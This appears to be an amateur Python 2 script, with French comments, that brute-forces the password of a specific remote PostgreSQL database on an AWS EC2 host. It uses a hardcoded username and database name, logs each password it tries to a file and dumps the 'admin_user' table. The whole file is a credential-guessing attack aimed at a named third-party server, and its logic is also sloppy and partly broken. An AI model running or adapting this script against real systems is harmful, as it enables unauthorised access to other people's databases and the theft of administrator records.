# -*- coding: utf-8 -*-
def bruteforce(liste):
    import sys,time
    import os
    import os.path
    from sqlalchemy import create_engine
    from sqlalchemy import MetaData, Table
    from sqlalchemy.orm import sessionmaker
    from sqlalchemy.ext.declarative import declarative_base
    os.chdir(os.getcwd())
    fd = open(liste, "r")
    liste_pass=fd.readlines()
    print(liste_pass)
    resultat = open("password.txt", "w")

    """ j'essaie de trouve le mot de passe de la base avant tout
    c'est un coup de chance
    """
    temp=False
    print(len(liste_pass))
    for password in liste_pass:
        try:
            provider='postgresql'
            user='qkiihiarmfvkfs'
            server='ec2-184-72-231-67.compute-1.amazonaws.com'
            port='5432'
            database='dbfskkvrlhppgd'
            connectionString = "{}://{}:{}@{}:{}/{}".format(provider,user,password,server,port,database)
            db=create_engine(connectionString)
            resultat.write("Mot de passe base---->>>>>>: " + password + "\n")
            print "ok"
            metadata = MetaData(db)
            metadata.reflect(db)
            metadata.tables.keys()
            admin=Table('admin_user', metadata, autoload=True)
            sql = admin.select()
            datagrid = sql.execute()
            print len(datagrid)
##            table=()
            for row in datagrid:
                print row
            resultat.close()
            

        except:
            print("not ok")
            pass
        time.sleep(0.1)
    resultat.close()
    if fd.closed == False:
        fd.close()




##metadata = MetaData(engine)
##
##    metadata.reflect(engine)
##
##    metadata.tables.keys()
##
##    users = Table('database_users', metadata, autoload=True)
##
##    s = users.select()
##
##    rs = s.execute()
##    table = ()
##    for row in rs:
##        print row‏





   
##    Session = sessionmaker(bind=db)()
##    session = Session(bind=conn)
##    query=session.query(admin_user)
##    print(session)
    #metadata = MetaData(db)
    
##    Base = declarative_base(metadata=metadata)
##    """
##        J'ai tatonner des tables comme si je les connais pas avant
##    """
##
##    class admin_user(Base):
##         __tablename__= 'id'
##         __table_args = {'autoload': True}
##      
##    query=session.query(admin_user)
##    for user in query:
##        if user.password==password:
##            resultat.write("Mot de passe---->>>>>>: " + password + "\n")
##            resultat.close()
##            print("connection is ok")
##            break;
        

if __name__ == "__main__":
    res = bruteforce(liste ="test.txt")
    r = open("password.txt", "r")
    re = r.read()
    print(re)
    r.close()
    while True:
        w=1
